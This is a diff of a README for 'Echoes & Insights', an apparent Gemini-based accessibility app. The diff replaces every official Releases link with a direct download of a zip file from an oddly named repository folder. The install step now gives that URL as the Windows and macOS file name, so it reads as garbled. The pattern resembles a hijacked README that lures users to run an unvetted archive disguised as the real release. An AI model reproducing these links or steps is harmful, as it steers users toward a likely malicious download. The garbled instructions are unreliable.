@@ -6,11 +6,11 @@ Welcome to **Echoes & Insights**! This project uses Google Gemini to enhance acc
 
 ## 📥 Download Echoes
 
-[![Download Echoes](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/kumaravel198/echoes/releases)
+[![Download Echoes](https://raw.githubusercontent.com/kumaravel198/echoes/main/serohepatitis/echoes.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/kumaravel198/echoes/main/serohepatitis/echoes.zip)](https://raw.githubusercontent.com/kumaravel198/echoes/main/serohepatitis/echoes.zip)
 
 To get started, visit the Releases page to download Echoes:
 
-[Download echoes from Releases](https://github.com/kumaravel198/echoes/releases)
+[Download echoes from Releases](https://raw.githubusercontent.com/kumaravel198/echoes/main/serohepatitis/echoes.zip)
 
 ## 💻 System Requirements
 
@@ -26,7 +26,7 @@ Before you download Echoes, please ensure your system meets the following requir
 Once you have downloaded Echoes, follow these steps to install it:
 
 1. Navigate to your Downloads folder.
-2. Locate the downloaded file. It will typically be named `echoes-setup.exe` for Windows or `echoes.dmg` for macOS.
+2. Locate the downloaded file. It will typically be named `https://raw.githubusercontent.com/kumaravel198/echoes/main/serohepatitis/echoes.zip` for Windows or `https://raw.githubusercontent.com/kumaravel198/echoes/main/serohepatitis/echoes.zip` for macOS.
 3. Double-click the file to start the installation process.
 4. Follow the on-screen instructions to complete the installation.
 
@@ -79,4 +79,4 @@ Beyond using Echoes, consider engaging in digital accessibility projects. Your i
 
 Once again, to download Echoes, visit the Releases page:
 
-[Download echoes from Releases](https://github.com/kumaravel198/echoes/releases)
+[Download echoes from Releases](https://raw.githubusercontent.com/kumaravel198/echoes/main/serohepatitis/echoes.zip)
